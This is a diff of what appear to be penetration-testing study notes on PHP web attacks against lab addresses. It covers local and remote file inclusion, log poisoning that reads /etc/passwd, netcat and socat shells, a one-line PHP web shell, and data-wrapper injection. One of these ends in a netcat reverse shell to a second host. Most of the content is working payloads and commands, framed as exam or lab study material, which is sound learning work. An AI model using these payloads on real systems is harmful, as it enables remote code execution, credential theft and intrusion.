@@ -103,19 +103,40 @@ http://192.168.231.52/menu.php?file=/var/log/apache2/access.log&cmd=cat /etc/pas
 /cmd.php&cmd=nc -nvlp 60000 -e /bin/bash
 socat -d TCP4-LISTEN:60000 EXEC:/bin/bash
 
+# Remote File Inclusion
 
+Lesson common than LFI but easier to exploit. PHP apps need to be configured with `allow_url_include` set to on. This was on by default previously, but is now off.  
+`http://192.168.231.52/menu.php?file=http://192.168.231.53/bad.txt`  
+You can test if the server will reach out with netcat.
 
+Other useful tricks:
+* Older versions of PHP allowed the use of a null byte to terminate any string and bypass file extensions (%00).
+* https://www.php.net/manual/en/security.filesystem.nullbytes.php
+* End RFI payloads wqith a question mark to make anything added to the URL server-side as part of the query string.
+* Use RFI with some of the webshells in /usr/share/webshells.
 
+Simple payload:  
+`<?php echo shell_exec($_GET['cmd']); ?>`
 
+In exercises serving up files with Apache did not always work, so test other web servers:  
+Python 2:  
+`python -m SimpleHTTPServer 7331`  
+Python 3:  
+`python3 -m http.server 80`  
+PHP:  
+`php -S 0.0.0.0:8000`  
+Ruby:  
+`ruby -run -e httpd . -p 9000`
+busybox:
+`busybox httpd -f -p 10000`
 
+# PHP Wrappers
 
+Protocol wrappers allow additional flexibility when attempting to inject PHP code via LFI vulnerabilities. Two useful wrappers are the data wrapper for inline data and base64 encoded data which allows for an alternative payload when there is no local file to poison.
 
+data : type of data : comma to mark start of contents.  
+`http://192.168.231.10/menu.php?file=data:text/plain,hello world`  
+`http://192.168.231.10/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>`  
+`192.168.231.10/menu.php?file=data:text/plain,<?php echo shell_exec("nc 192.168.119.231 80 -e cmd.exe") ?>`  
 
-
-
-
-
-
-
-
-
+# SQL Injection
